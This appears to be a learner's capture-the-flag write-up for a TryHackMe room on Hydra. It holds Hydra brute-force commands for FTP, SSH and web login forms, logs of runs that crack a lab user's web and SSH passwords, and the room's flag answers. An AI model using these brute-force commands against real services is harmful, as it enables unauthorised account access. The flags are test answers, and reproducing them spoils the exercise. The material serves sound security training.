# Task 1 [Hydra Introduction]
----

## What is Hydra?
----

>>Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

>>We can use Hydra to run through a list and 'bruteforce' some authentication service. Imagine trying to manually guess someones password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

>>Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

>>For more information on the options of each protocol in Hydra, read the official Kali Hydra tool page: https://en.kali.tools/?p=220

>>This shows the importance of using a strong password, if your password is common, doesn't contain special characters and/or is not above 8 characters, its going to be prone to being guessed. 100 million password lists exist containing common passwords, so when an out-of-the-box application uses an easy password to login, make sure to change it from the default! Often CCTV camera's and web frameworks use admin:password as the default password, which is obviously not strong enough.

----

# Task 2 [Using Hydra] 
----

## Hydra Commands

>>The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```
>>For the purpose of this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

## SSH
----

```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

## Post Web Form
----

>>We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

>>Below is an example Hydra command to brute force a POST login form:

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

>>You should now have enough information to put this to practise and brute-force yourself credentials to the deployed machine!

----

# MY DOCUMENTATION :
----

>>WEB CREDS BRUTE FORCING

```bash
root@ip-10-10-125-200:~# hydra -l molly -P rockyou.txt 10.10.157.93 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-01 15:44:51
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.157.93:80//login:username=^USER^&password=^PASS^:F=incorrect
[80][http-post-form] host: 10.10.157.93   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-01 15:45:06

# LOGIN TO THE WEBSITE TO GET THE FLAG
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

>>SSH BRUTE FORCING 

```bash 
root@ip-10-10-125-200:~# hydra -l molly -P rockyou.txt 10.10.157.93 -t 4 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-01 15:27:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.157.93:22/
[22][ssh] host: 10.10.157.93   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-01 15:27:57
root@ip-10-10-125-200:~# ssh molly@10.10.157.93
The authenticity of host '10.10.157.93 (10.10.157.93)' can't be established.
ECDSA key fingerprint is SHA256:W6tgaf543kaSrUmq4/RQ5qQWtTR4x5fv83qtl4f7q/I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.157.93' (ECDSA) to the list of known hosts.
molly@10.10.157.93's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-157-93:~$ ls
flag2.txt
molly@ip-10-10-157-93:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```
----

# Answer the questions below
----

1.Read the above and have Hydra at the ready.
>>No answer needed

2.Use Hydra to bruteforce molly's web password. What is flag 1?
>>THM{2673a7dd116de68e85c48ec0b1f2612e}

3.Use Hydra to bruteforce molly's SSH password. What is flag 2?
>>THM{c8eeb0468febbadea859baeb33b2541b}

----